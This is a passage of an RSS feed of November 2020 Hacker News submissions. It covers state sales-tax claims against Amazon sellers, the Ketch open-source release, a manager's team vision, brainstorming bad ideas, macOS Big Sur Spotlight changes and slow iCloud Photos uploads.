Amazon sellers than they do Black &amp; Decker for their sales within Home Depot,” said Paul Rafelson, executive director of the guild.</p><p>But California isn’t alone in trying to directly collect from sellers, with Massachusetts, Minnesota, Washington and Wisconsin also sending demands for back taxes in recent years.</p><p>In South Carolina, however, the state is targeting Amazon itself. It <a href="https://www.realclearmarkets.com/articles/2020/01/24/south_carolina_overreaches_in_its_attempt_to_grab_more_amazon_dollars_104053.html#:~:text=Now%2C%20South%20Carolina%20is%20trying,and%20it%20has%20a%20case." target="_blank">sued the company for $12.5 million</a> in unpaid sales tax, interest, and penalties for the first quarter of 2016 alone. An administrative law judge sided with South Carolina, but that ruling is under appeal. The state says Amazon is liable for remitting sales tax for third-party marketplace sales because customers are using Amazon’s website and fulfillment services for the purchase.</p><p>Amazon <a href="https://d18rn0p25nwr6d.cloudfront.net/CIK-0001018724/96cf5724-d8f6-41ee-b7e0-cf5791ad7de2.pdf" target="_blank">said last year</a> the ruling was without merit and hinted at the scale of the potential financial hit if other states followed this tack. “If South Carolina or other states were successfully to seek additional adjustments of a similar nature, we could be subject to significant additional tax liabilities.”</p><p>Most states sought to clarify the responsibility for collecting taxes after the landmark 2018 Supreme Court ruling that allowed states to collect sales taxes from online sellers, no matter where those merchants are located. In enacting their own sales tax laws, many governments made a distinction between businesses doing direct sales to in-state consumers and those done via online marketplaces such as Amazon or Ebay.</p><p>These marketplace facilitator laws, which have been passed in<a href="https://btfgatsby.revivedesignstudios.com/blog/random-awesomeness/soapbox/roundup-marketplace-facilitator-laws-enacted-in-33-states-via-tax-notes-nexus-tracker/#:~:text=The%2033%20states%20that%20have,Oklahoma%2C%20Pennsylvania%2C%20Rhode%20Island%2C" target="_blank"> 33 of the 45 sales tax states</a>, make clear that the marketplace platform is responsible for collecting sales taxes—not the merchant who is providing the product. The intent was to keep in place protections for small business owners for whom it may be cost prohibitive to comply with dozens of different sales tax laws. For example, California’s law that took effect in 2019 says that remote retailers must register to collect and remit sales tax once their annual sales into the state exceed $500,000.</p><p>But far from clearing things up, those facilitator laws have in some cases added to the confusion. In California, State Treasurer Fiona Ma <a href="https://onlinemerchantsguild.org/wp-content/uploads/2019/03/Letter-to-Governor-Newsom.pdf" target="_blank">criticized the CDFTA’s approach</a>, calling it “a wrong-headed and retroactive administration of the state’s tax law.” She argued in a letter to Gov. Gavin Newsom that the state’s policy was unfair to small businesses without the ability to comply, while possibly forcing them out of business. Since then, the legislature passed another law that limited the state’s look-back period to 2016 for collecting marketplace sales taxes, but&nbsp; that still targets sellers.</p><p>Scott Peterson, Avalara’s vice president of U.S. tax policy, said that state legislatures can &nbsp;potentially step in to protect marketplace sellers from past tax liability. But in California, that ship has likely sailed.</p><p>“They could have let the past be the past,” he said. “But instead they doubled down.”<svg>
<use xlink:href="/static/b/base/svg/spritesheet.svg#icon-rf-shield-alt"></use>
</svg></p></div></div>
</div></div>]]>
            </description>
            <link>https://www.route-fifty.com/finance/2020/11/states-small-businesses-amazon-millions-back-sales-taxes/169999/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25073467</guid>
            <pubDate>Thu, 12 Nov 2020 19:01:01 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Shipa Open Sources Ketch]]>
            </title>
            <description>
<![CDATA[
Score 7 | Comments 1 (<a href="https://news.ycombinator.com/item?id=25073458">thread link</a>) | @129jdsf
<br/>
November 12, 2020 | https://www.tfir.io/shipa-open-sources-ketch/ | <a href="https://web.archive.org/web/*/https://www.tfir.io/shipa-open-sources-ketch/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
                                                                
                                                                        <p><a href="https://www.shipa.io/">Shipa</a> is open sourcing <a href="http://theketch.io/">Ketch</a>, Shipa’s deployment engine, under Apache License Version 2.0. This open source release follows the <a href="https://www.globenewswire.com/news-release/2020/10/08/2105531/0/en/Shipa-Launches-with-Unique-Solution-for-Developing-Deploying-and-Managing-Cloud-Native-Applications-No-Kubernetes-Expertise-Necessary.html">general availability launch</a> of Shipa’s full application management framework in October.</p>
<p>Using Ketch, application developers can manage the entire deployment process at the application level. Developers can stay focused on writing code and do not need any Kubernetes expertise to deploy applications running on Kubernetes.</p>
<p>As a result, teams can accelerate the time needed to adopt Kubernetes, while simultaneously increasing their pipeline’s resilience and reducing the compounding risk with each new deployment.</p>
<p>Ketch reduces the number of Kubernetes objects that developers must learn and maintain in order to leverage Kubernetes best practices for managing applications. The deployment engine does this by generating all Kubernetes-related objects that are required to run applications on Kubernetes – automatically and directly from their application code.</p>
<p>Ketch also enables developers to generate Helm charts directly from the application code, allowing them to fully customize ingress, services, security, resources and more before deployment. Developers can also use their existing container images, in which case Ketch creates and deploys all necessary objects for the application to run.</p>
<p>Ketch offers connections into existing clusters (beginning with Kubernetes 1.14+) and improves the developer experience and application delivery speed by fitting into developers’ existing stack.</p>
<p>Shipa is a Silver member of the Cloud Native Computing Foundation and a General member within the Continuous Delivery Foundation.</p>
<p>Shipa is funded by Engineering Capital and Jump Capital; advisors include Google’s Kelsey Hightower, Mastercard’s Ken Owens, and Lyft’s Matt Klein.</p>

<!-- AI CONTENT END 1 -->
    							</div></div>]]>
            </description>
            <link>https://www.tfir.io/shipa-open-sources-ketch/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25073458</guid>
            <pubDate>Thu, 12 Nov 2020 18:59:59 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[My Vision for Our Work Together (Statement from a New Engineering Manager)]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25073285">thread link</a>) | @ninjakeyboard
<br/>
November 12, 2020 | https://multiplexedmusings.com/2020/11/08/my-vision-for-our-work-together/ | <a href="https://web.archive.org/web/*/https://multiplexedmusings.com/2020/11/08/my-vision-for-our-work-together/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="wrap">

	<!-- BEGIN #header -->
	

<!-- BEGIN .container -->
<div>

	<!-- BEGIN .row -->
	<div>

		<!-- BEGIN .twelve columns -->
		<div>
	        <!-- BEGIN .postarea -->
<div>

	
	

	
	
<p>(This is a living document and will change and evolve over time. I’m writing this for my new team so that we may develop a vision together.)</p>



<p>This article outlines what I want us to accomplish together, and how I think we can get there. I want us to have a tremendous impact on the organization. I want us to lead by example, both as a team, and as individuals. I want our team to be seen as the very best. And I want us to get there by being our truest and most authentic selves. I want us to enjoy the journey together and to believe in what we’re doing. </p>



<p><strong>On moving into the future: </strong>Ours is an older tech company with a long history. I remember us in the 90s. I never want us to feel burdened by where we came from. I never want us to do things because it’s the way that they’ve always been done. I want us to incorporate all of our learnings and experience to find a new and better way for tomorrow while meeting the demands of today. I want us to learn from all of our past mistakes, and to not make them again. I want to look at modern approaches, tools, and technologies, and find the way that makes sense for us as humans to adopt, borrow, and be inspired with them while understanding that technology and practices are tools and that there is no best tool to use, but only the best tools for the problems AND for the people solving the problems. We should always consider the people and the solutions together, knowing that we have to support and build tomorrow on what we create today.</p>



<p><strong>On relationships:</strong> I’ve been through a lot. I know we all have. Life has been hard. Very often we show a shiny veneer of strength and stability. Our inner worlds can be much more tumultuous. I want us to connect as humans, not as co-workers and employees. I want you to feel safe knowing you will have some bad days. I want to give you my trust, knowing that you want to do your best and I want your trust knowing that I will do my best. I want you to feel protected when something goes wrong or when you make a mistake. I want you know that you can be honest with me and that I’ll do my best to protect you in those challenging moments.</p>



<p><strong>On psychological safety: </strong>I commit to making you feel safe, protected, understood, healthy and cared-for. I commit to doing this to the very best of my ability. I commit to working tirelessly to get us there.</p>



<p><strong>On communication:</strong> sometimes we may feel that we say things because it’s the right thing to say in a group (this is called <strong>“Groupthink”</strong>). Even if it’s not what we really believe, we may feel that it’s easier to say what people want to hear. <strong>I do not want us to do that. </strong>I want us to identify “Groupthink” and to stop it in its tracks. I want to <strong>encourage dissent</strong>. I want you to have strong opinions and to voice them. But I want us to <strong>hold our strong opinions loosely</strong>, so that we may come together, hear each other and be heard. I want to find the right way forward with honest agreement. If we cannot change opinions to meet our own, we must find the truth in other people’s opinions until we truly believe that it is the way forward. Or we must find a solution that’s better than any of the opinions on the table that everyone feels good with. I commit to you to never demand we move in a direction. <strong>I commit to you that I will encourage your dissent, do my best to understand your opinion, and find a way forward where everyone feels heard, understood, and in agreement.</strong></p>



<p><strong>On reward:</strong> We are all unique.<strong> Intrinsic motivators</strong> differ for each of us. I vow to connect with you as a human individual and to understand what really drives you. For some of us it is learning and personal growth. For some it is acknowledgement and recognition. For some it is seeing the reality and impact of the work that we do. We are motivated by all of these in some degree in different ways and at different times. I vow to give you the opportunities that you desire. I will devote myself to helping you grow and shine and make a difference in the world around you. I never want to reward you for something different than what we really want as a team (<strong>“Rewarding X but Hoping for Y”</strong>.) And I promise to do my best to work with you to ensure you are getting you what you need to connect with the work that you do, to have fun and feel good about it.</p>



<p><strong>On measurement: </strong>What we are measured on is what we deliver on. I commit to measure you to show your strength and contribution. I commit to working to ensure others see this as well. I’ve seen people contribute great value but barely be recognized for their work – I commit to showing your contributions and ensuring your work is celebrated.</p>



<p>This is my vision for us as a team. How we get there will be up to us to discover. It will be an iterative process, and we must communicate and revisit the vision and ensure our strategies align and grow to meet this.</p>

	
	<!-- BEGIN .postmeta -->
	

	<!-- .post-navigation -->

	
<!-- #comments -->

	

	
<!-- END .postarea -->
</div>		</div><!-- END .twelve columns -->

	</div><!-- END .row -->

</div><!-- END .container -->





<!-- BEGIN #footer -->


<!-- END #wrap -->
</div></div>]]>
            </description>
            <link>https://multiplexedmusings.com/2020/11/08/my-vision-for-our-work-together/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25073285</guid>
            <pubDate>Thu, 12 Nov 2020 18:48:14 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[The Problem of Twelve: Interactive Dashboard]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25073236">thread link</a>) | @greatwave1
<br/>
November 12, 2020 | https://www.quiverquant.com/sources/sharedownership?c= | <a href="https://web.archive.org/web/*/https://www.quiverquant.com/sources/sharedownership?c=">archive.org</a>
<br/><!-- hnss:readable-content --><hr/>Unable to extract article]]>
            </description>
            <link>https://www.quiverquant.com/sources/sharedownership?c=</link>
            <guid isPermaLink="false">hacker-news-small-sites-25073236</guid>
            <pubDate>Thu, 12 Nov 2020 18:45:35 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[The Worst Possible Solution]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25073063">thread link</a>) | @lucaronin
<br/>
November 12, 2020 | https://refactoring.fm/p/the-worst-possible-solution- | <a href="https://web.archive.org/web/*/https://refactoring.fm/p/the-worst-possible-solution-">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>A few months ago I attended a <a href="http://designleadership.clinic/">Design Leadership program</a>. I enjoyed it thoroughly, as <a href="https://www.designleadership.clinic/pageus">Duane and Stefane</a> discussed their methodology to turn "design-thinking" into "design-doing".</p><p>Towards the end of the course, we talked of <em>Brainstorming</em>.</p><h3>🧠 Brainstorming</h3><p>In a Design workflow, Brainstorming belongs to the <em>Ideation</em> phase, that is, the moment you produce an output based on requirements provided by the <a href="https://en.wikipedia.org/wiki/Design_brief">Brief</a>.</p><p>Its principles, though, make it useful in any context where you have to converge, as a group, on some creative decision — like Product / Engineering strategy, or company-wide settings like OKR planning.</p><p>At its core, Brainstorming is a session that involves a group of stakeholders, bringing diverse perspectives to the table, with the goal of producing a good output that is participated by the whole group.</p><p>Here, the output being <em>participated</em> is just as important as it being <em>good —</em> more so, sometimes <em>good</em> and <em>participated</em> actually mean the same thing.</p><h3>🤝 Converging</h3><p>If we take a product perspective, converging on what to do next is often a long and painful process, especially when several stakeholders are involved. To do it right, it requires a good amount of iteration — as shown, for instance, in the great <a href="https://firstround.com/review/the-secret-to-a-great-planning-process-lessons-from-airbnb-and-eventbrite/">W Framework</a> from Airbnb and Evenbrite.</p><p>The problem with converging is that people come from different starting points. That is, they have different <em>values</em> about what's good and bad.</p><p>To make things harder, where people stand in terms of such values is often unclear at the beginning. In order to come to an output, these values should be progressively surfaced and inform the group's decisions.</p><h3>💩 What's the <em>worst solution</em> for this?</h3><p>Now, I believe we are all used to brainstorming the <em>best </em>possible solutions for problems. What a few people do, however, is trying to think at the <em>worst</em> ones as well.</p><p>In particular, let's take a problem and think of two classes of solutions:</p><ol><li><p>👍 <strong>The Best Solutions</strong> — those that look the most promising to participants.</p></li><li><p>👎 <strong>The Worst Solutions</strong> — those that either make the problem worse, or solve it at the expense of creating much bigger ones.</p></li></ol><p>As an example, during the program we analyzed the pain of 🚗 <strong>traffic congestion</strong> in cities, and came up, among others, with the following solutions:</p><div><figure><a target="_blank" href="https://cdn.substack.com/image/fetch/f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fbucketeer-e05bbc84-baa3-437e-9518-adb32be77984.s3.amazonaws.com%2Fpublic%2Fimages%2F8913a109-2f02-4bdc-8e3c-469107eb09cb_2004x1584.png"><img src="https://cdn.substack.com/image/fetch/w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fbucketeer-e05bbc84-baa3-437e-9518-adb32be77984.s3.amazonaws.com%2Fpublic%2Fimages%2F8913a109-2f02-4bdc-8e3c-469107eb09cb_2004x1584.png" data-attrs="{&quot;src&quot;:&quot;https://bucketeer-e05bbc84-baa3-437e-9518-adb32be77984.s3.amazonaws.com/public/images/8913a109-2f02-4bdc-8e3c-469107eb09cb_2004x1584.png&quot;,&quot;height&quot;:1151,&quot;width&quot;:1456,&quot;resizeWidth&quot;:null,&quot;bytes&quot;:299103,&quot;alt&quot;:null,&quot;title&quot;:null,&quot;type&quot;:&quot;image/png&quot;,&quot;href&quot;:null}" alt=""></a></figure></div><p>During the discussion, it turns out the worst solutions provided as many insights as the best ones. They attacked the problem from unexpected sides and contributed significantly to our progress as a group.</p><p>Brainstorming bad ideas, in fact, exposes people's values about what's bad, and that's as much as useful as exposing what's good. Because the faster the two extremes are surfaced and understood, the easier is for the group to converge.</p><h3>🗯 Controversial ideas and Startups</h3><p>You also get to see something peculiar: some bad ideas are surprisingly similar, or related somehow, to the good ones.</p><div><figure><a target="_blank" href="https://cdn.substack.com/image/fetch/f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fbucketeer-e05bbc84-baa3-437e-9518-adb32be77984.s3.amazonaws.com%2Fpublic%2Fimages%2Fd8773d1c-2c3b-4fff-9ddd-c76e4017433b_1934x1324.png"><img src="https://cdn.substack.com/image/fetch/w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fbucketeer-e05bbc84-baa3-437e-9518-adb32be77984.s3.amazonaws.com%2Fpublic%2Fimages%2Fd8773d1c-2c3b-4fff-9ddd-c76e4017433b_1934x1324.png" data-attrs="{&quot;src&quot;:&quot;https://bucketeer-e05bbc84-baa3-437e-9518-adb32be77984.s3.amazonaws.com/public/images/d8773d1c-2c3b-4fff-9ddd-c76e4017433b_1934x1324.png&quot;,&quot;height&quot;:997,&quot;width&quot;:1456,&quot;resizeWidth&quot;:null,&quot;bytes&quot;:274218,&quot;alt&quot;:null,&quot;title&quot;:null,&quot;type&quot;:&quot;image/png&quot;,&quot;href&quot;:null}" alt=""></a></figure></div><p>In our traffic congestion case, you see <em>more taxi</em> among the worst ones, and <em>car sharing</em> among the best. If you think about it, they are not so different: they are both about replacing private cars with some kind of shared vehicles.</p><p>The fact that they appear in the two extremes suggests that there is some controversy about an underlying theme. In this case, it might be <em>car ownership</em>.</p><p>Controversy is powerful because some of the very best ideas are born out of it. Quoting <a href="http://www.paulgraham.com/swan.html">Paul Graham</a>, the best Startup ideas live at the intersection of <em>looking bad</em> and <em>actually being good:</em></p><blockquote><p><em>The first time Peter Thiel spoke at YC he drew a Venn diagram that illustrates the situation perfectly. He drew two intersecting circles, one labelled "seems like a bad idea" and the other "is a good idea". The intersection is the sweet spot for startups.</em></p><p><em>This concept is a simple one and yet seeing it as a Venn diagram is illuminating. It reminds you that there is an intersection — that there are good ideas that seem bad. It also reminds you that the vast majority of ideas that seem bad are bad.</em></p></blockquote><h3>📚 Takeaway</h3><p>In my experience, brainstorming both good and bad ideas surfaces the full spectrum of people's values. This is more useful than just thinking of the good ones, and makes a group converge on a solution faster and with more confidence.</p><p>You can try it out the next time you discuss a problem for which the solution is unclear and should be participated by multiple stakeholders 🙌</p><p><strong>Do you follow any formal process to produce new ideas in your team? Be them about  product, engineering or any other function. If yes, how does it work? I am curious to discuss it in the comments or via email</strong> 👇</p><p><em>Hey, I am Luca 👋 thank you for reading this through!</em></p><p><em>Every week I publish something about making software, working with people and personal growth. If you haven’t already, you can subscribe below to receive new posts in your inbox!</em></p></div></div>]]>
            </description>
            <link>https://refactoring.fm/p/the-worst-possible-solution-</link>
            <guid isPermaLink="false">hacker-news-small-sites-25073063</guid>
            <pubDate>Thu, 12 Nov 2020 18:34:14 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Spotlight changes in macOS 11 Big Sur]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25072845">thread link</a>) | @brandonhorst
<br/>
November 12, 2020 | https://lacona.app/blog/2020/11/11/spotlight-changes-in-big-sur.html | <a href="https://web.archive.org/web/*/https://lacona.app/blog/2020/11/11/spotlight-changes-in-big-sur.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>macOS 11 Big Sur changed Spotlight to bring it more in line with iPadOS search. These changes are intended to simplify things, but they create inconsistencies that may be confusing both to newcomers and to long-time users.</p>

<p>Ultimately, there are three interconnected changes: <a href="#spotlight-11-hidden-previews">hidden previews</a>, <a href="#spotlight-11-disclosure-indicators">disclosure indicators</a>, and <a href="#spotlight-11-suggestions">suggestions</a>. This post will analyze the changes and provide <a href="#spotlight-11-recommendations">recommendations</a> to help frustrated users.</p>

<p>Of course, I believe that <a href="https://lacona.app/">Lacona</a> is an alternative to Spotlight that is both more usable and more powerful, but I won’t be making comparisons to Lacona in this analysis.</p>



<p>Just as before, you call up Spotlight by pressing <code>⌘+Space</code>, or by clicking the magnifying glass icon in the menu bar. However, things change once you start typing.</p>

<p>In macOS X, Spotlight showed your <em>search results</em> in a list on the left side, with a <em>preview</em> on the right side. In Big Sur, the search results are presented in a single list, with no visible preview.</p>

<p><img src="https://lacona.app/img/posts/spotlight-1.png" alt="Spotlight &quot;app&quot; screenshot"></p>

<p>These previews—which were originally introduced as a headlining feature of macOS 10.10 Yosemite—are not actually gone, just hidden. Clicking on a result, or pressing <code>Tab</code> will show the preview.</p>

<p>It’s clear that hiding the preview is an attempt to make the interface appear simpler and more iOS-like. Indeed, it frees up space; but the new space isn’t actually used for anything. For most queries, this space is left completely empty. What’s worse, this whitespace visually separates the results from the crucial new interface element on the far right side, the <em>disclosure indicator</em>.</p>

<h2 id="spotlight-11-disclosure-indicators">Disclosure Indicators</h2>

<p>Some results have a small iOS-style arrow on the far right side. Apple refers to this arrow as a disclosure indicator. It indicates that pressing <code>Return</code> on this result will not open anything, but will instead display the preview on the right side of the window.</p>

<p>Once the preview is displayed, pressing <code>Return</code> again will open the result, even though the disclosure indicator is still present.</p>

<p><img src="https://lacona.app/img/posts/spotlight-2.png" alt="Spotlight &quot;apple stock&quot; screenshot"></p>

<p>These results can be very useful! However, for the first time in Spotlight’s history, ambiguity is introduced to the <code>Return</code> key. Some may consider this necessary complexity, but it’s not the last inconsistency we’ll see today.</p>

<h2 id="spotlight-11-suggestions">Suggestions</h2>

<p>In addition to showing search results, Spotlight now has an additional unlabeled section which I call <em>suggestions</em>. Directly below the unlabeled “top results” section for any given search, there is a section containing a handful of queries that Spotlight believes you may be typing. Some of these queries show the icon of your default web browser, and others show a Spotlight icon and have a disclosure indicator. The number and order of these results varies, but they could take up as much as 83% of the results “above the fold”.</p>

<p><img src="https://lacona.app/img/posts/spotlight-3.png" alt="Spotlight &quot;apple&quot; screenshot"></p>

<p>These suggestions are based on both “Siri Suggestions” and the files of your Mac. This behavior is interesting, but I can’t say it’s very useful; the files referenced always show up further down on the list.</p>

<p>When selecting one of the results with the web browser icon, Spotlight will search for the query using your default web search engine in your default browser.</p>

<p>When selecting one of the results with the Spotlight icon, your input query will change to the suggestion, and the preview will also be shown.</p>

<h4 id="the-problem-with-suggestions">The Problem with Suggestions</h4>

<p>The most important inconsistencies with these suggestions come when using the mouse. Since the inception of OSX, clicking has meant <em>select</em>. Single-click a file in Finder or a track in Music, and it will be selected. This is how Spotlight used to work, and all non-suggestion results in Spotlight still work this way.</p>

<p>However, for suggestion results, clicking will <em>activate them immediately</em>. This, you may notice, is the way things work on iPadOS. Not only is this inconsistent with macOS in general, it is inconsistent with other results <em>on the very same list</em>. Worse still, because the suggestions section is unlabeled, it becomes harder to figure out exactly what clicking on a result will do.</p>

<p>Even with the keyboard, these suggestions behave completely differently from all other results. I originally tried to write out all different cases, but the inconsistencies are too numerous to list with text. I’ve attached an <a href="#spotlight-11-appendix">appendix</a> enumerating all the cases.</p>

<p>Overall, the suggestions section is Spotlight’s biggest step backward in usability. Its behavior is inconsistent and confusing, it takes up huge portions of the most important result space, and its utility is situational at best. Worst of all, this is the only section which cannot be fully disabled in the Spotlight preferences. <em>You’re stuck with it.</em></p>

<h2 id="spotlight-11-recommendations">Recommendations</h2>

<p>To make your search experience better, here are some recommendations:</p>

<ul>
  <li>Expand the window by dragging from the bottom, so that more results can be displayed.</li>
  <li>Ignore the “suggestions” section and its inconsistent behavior.</li>
  <li>Consider disabling “Siri Suggestions” in the Spotlight preferences, which removes many (but not all) of the suggestions.</li>
  <li>Don’t rely on the mouse for selecting items. Use the <code>⌘+Down</code> and <code>⌘+Up</code> shortcuts to quickly move the selection between entire sections with the keyboard.</li>
  <li>Press <code>Tab</code> whenever you want to see a Preview of the results.</li>
  <li>Consider using a Spotlight alternative with a more considered design.</li>
</ul>

<h2 id="conclusion">Conclusion</h2>

<p>Spotlight in macOS 11 Big Sur is torn between two between different worlds.</p>

<p>In one dimension, it introduced iOS ideas like disclosure indicators and single-tap actions for its new features. However, it only went half way, leading to an inconsistent and unpredictable experience.</p>

<p>In another dimension, it is trying to introduce AI-powered suggestions to make Spotlight more proactive and Siri-like. However, these suggestions are too constrained by the existing Spotlight interface to be very useful, and take up valuable space that could be used for the more reliable features.</p>

<p>In future releases, I hope that Apple can push Spotlight fully into simplified iOS paradigm, or retreat to the power of macOS. In macOS 11 Big Sur, it tries to straddle the line and fails at both.</p>

<h2 id="spotlight-11-appendix">Appendix: Behavior Changes</h2>

<h4 id="spotlight-behavior-in-macos-1015-catalina-and-prior">Spotlight Behavior in macOS 10.15 Catalina (and Prior)</h4>

<table>
  <thead>
    <tr>
      <th>&nbsp;</th>
      <th>Return</th>
      <th>Click</th>
      <th>Double Click</th>
      <th>⌘+Return</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td>File Result</td>
      <td>Open</td>
      <td>Select</td>
      <td>Open</td>
      <td>Show in Finder</td>
    </tr>
    <tr>
      <td>Other Result</td>
      <td>Open</td>
      <td>Select</td>
      <td>Open</td>
      <td>Open</td>
    </tr>
  </tbody>
</table>

<h4 id="spotlight-behavior-in-macos-11-big-sur">Spotlight Behavior in macOS 11 Big Sur</h4>

<table>
  <thead>
    <tr>
      <th>&nbsp;</th>
      <th>Return</th>
      <th>Tab</th>
      <th>Click (Selected)</th>
      <th>Click (Unselected)</th>
      <th>Double Click</th>
      <th>⌘+Return</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td>File Result</td>
      <td>Open</td>
      <td>Show preview</td>
      <td>Open</td>
      <td>Select and show preview</td>
      <td>Open</td>
      <td>Show in Finder</td>
    </tr>
    <tr>
      <td>Web Result</td>
      <td>Open</td>
      <td>Show preview</td>
      <td>Open</td>
      <td>Select and show preview</td>
      <td>Open</td>
      <td>Show preview</td>
    </tr>
    <tr>
      <td>Result with disclosure indicator</td>
      <td>Show preview</td>
      <td>Show preview</td>
      <td>Show preview</td>
      <td>Select and show preview</td>
      <td>Open</td>
      <td>None</td>
    </tr>
    <tr>
      <td>Previewed result with disclosure indicator</td>
      <td>Open</td>
      <td>None</td>
      <td>Open</td>
      <td>Select</td>
      <td>Open</td>
      <td>None</td>
    </tr>
    <tr>
      <td>Spotlight Completion</td>
      <td>Modify input</td>
      <td>Select input</td>
      <td>Modify input</td>
      <td>Modify input</td>
      <td>Modify input</td>
      <td>None</td>
    </tr>
    <tr>
      <td>Browser Completion</td>
      <td>Open</td>
      <td>Select input</td>
      <td>Open</td>
      <td>Open</td>
      <td>Open</td>
      <td>None</td>
    </tr>
    <tr>
      <td>Other Result</td>
      <td>Open</td>
      <td>Show preview</td>
      <td>Open</td>
      <td>Select and show preview</td>
      <td>Open</td>
      <td>Open</td>
    </tr>
  </tbody>
</table>
</div></div>]]>
            </description>
            <link>https://lacona.app/blog/2020/11/11/spotlight-changes-in-big-sur.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-25072845</guid>
            <pubDate>Thu, 12 Nov 2020 18:18:01 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Why iCloud Photos is slow to upload on macOS]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25072695">thread link</a>) | @shivpatelssp
<br/>
November 12, 2020 | https://shivpatel.io/software/2020/11/12/how-icloud-photos-architecture-causes-slow-uploads.html | <a href="https://web.archive.org/web/*/https://shivpatel.io/software/2020/11/12/how-icloud-photos-architecture-causes-slow-uploads.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div itemprop="articleBody">
    <p>The word <em>uploads</em> is in quotes for a reason. Let’s find out why…</p>


<ul>
  <li>2019 16” MacBook Pro
    <ul>
      <li>2.6 GHz 6-Core Intel Core i7</li>
      <li>macOS Catalina 10.15.7</li>
      <li>Photos 5.0 (161.0.120)</li>
    </ul>
  </li>
  <li>Roughly 1,800 media files (JPG, HEIC, PNG, MOV, MP4) totaling 50GB</li>
  <li>Full gigabit connection (1,000 Mbps up, 1,000 Mbps down)</li>
  <li>Google Photos as a benchmark for comparison</li>
</ul>



<p>First, I tried Google Photos. Drag-and-drop into the Chrome tab. Roughly 20 minutes later all 50GB worth of media is done uploading.</p>

<p>I’m able to view most my media instantly online. Google takes 3 hours to further process 160 videos in my upload; likely to convert them into a more compatible format (<em>foreshadowing</em>).</p>

<p>This experience seems reasonable, so let’s use it as our baseline.</p>



<p>I upgrade my account to the 200GB tier and enable iCloud Photo syncing on my Mac. Drag and drop the media files into the native Photos app and off we go!</p>

<p>One hour later… only 31 items uploaded. 😯</p>

<p>Eight hours later… only 97 items uploaded. 🤔</p>

<p>My ISP can’t be the issue. Google Photos had worked fine. I’m able to browser the web just fine. My Mac doesn’t seem to be doing anything intensive either; no excessive heat or fan noise.</p>

<p>A few DuckDuckGo searches later, it’s becoming very apparent others are experiencing the same issue. Most people blame Apple’s servers for being slow or rant about how bad their ISP is. Something doesn’t seem right.</p>



<p>I start my debugging process in Activity Monitor. Things become obvious very quick:</p>

<p><img src="https://shivpatel.io/assets/icloud-photos-activity-monitor.png" alt="iCloud Photos Upload Processes"></p>

<p>Let’s breakdown the two processes:</p>

<p><code>VTEncoderXPCService</code> is a sandboxed host used by QuickTime for video and audio decoding. The VT stands for <code>VideoTooolbox</code>. It’s used to process content when an app calls the built-in macOS audio and video API. It could be triggered by the Photos app, but it could also be a video playing in a web browser like Firefox.</p>

<p><code>com.apple.photos.VideoConversionService</code> doesnt need an explanation. The name gives it all away.</p>

<p>Considering the latter process name and the fact that I didn’t have any other apps open at the time, it’s pretty obvious Photos is doing some sort of video conversion. But why?</p>

<p>After some more research, I came across the following statement on Apple’s website:</p>

<blockquote>
  <p>File types that you can use with iCloud Photos</p>
</blockquote>

<blockquote>
  <p>Your photos and videos are stored in iCloud exactly as you took them. All of your images are held in their original formats at full resolution — HEIF, JPEG, RAW, PNG, GIF, TIFF, HEVC, and MP4 — as well as special formats you capture with your iPhone, like slo-mo, time-lapse, 4K videos, and Live Photos.</p>
</blockquote>

<p>Source: <a href="https://support.apple.com/en-us/HT204264">https://support.apple.com/en-us/HT204264</a></p>

<p>Ah ha! If you recall earlier, I mentioned my test media included MOV files. These are old family videos converted and exported via QuickTime Player. MOV is not a supported format according to the above statement.</p>

<p>Additionally, when I track the upload count in the Photos app, I can infer that media is being uploaded by date; newest to oldest. The count consistently lags at the index of an MOV file.</p>

<p><img src="https://shivpatel.io/assets/icloud-photos-progress-bar.png" alt="Photos Progress Bar"></p>



<p>Photos is likely converting incompatible media files into an iCloud desired format before uploading them.</p>

<p>More importantly, <strong>it seems Apple has made the architectural decision to convert incompatible iCloud media on the end user’s device, instead of processing it in the cloud</strong> like Google Photos.</p>



<p>Converting before uploading isn’t a big deal. Heck, I give Apple credit for choosing a decentralized and cost efficient architecture.</p>

<p><strong>The real issue is an overly simplified user experience that’s missing transparency.</strong> It took an  engineer an hour to figure out what was happening. I can only imagine how millions of non-technical Apple users would feel. Search Google and you’ll see the widespread frustration and confusion with iCloud Photos and “slow uploads.”</p>



<p>We all know when our Mac has entered beast mode to tackle CPU intensive tasks; fans blazing and toasty to the touch. Try converting video files in <a href="http://handbrake.fr/">HandBrake</a> and you’ll see exactly what I’m saying.</p>

<p><strong>The Photos app however, avoids beast mode and slows the rate of video conversion in the background.</strong> It makes sense that Apple does not want to impair your foreground experience or raise concerns by running your Mac at full speed. <strong>But it also makes it really hard to see what’s happening and significantly increases the time required to complete conversions.</strong></p>


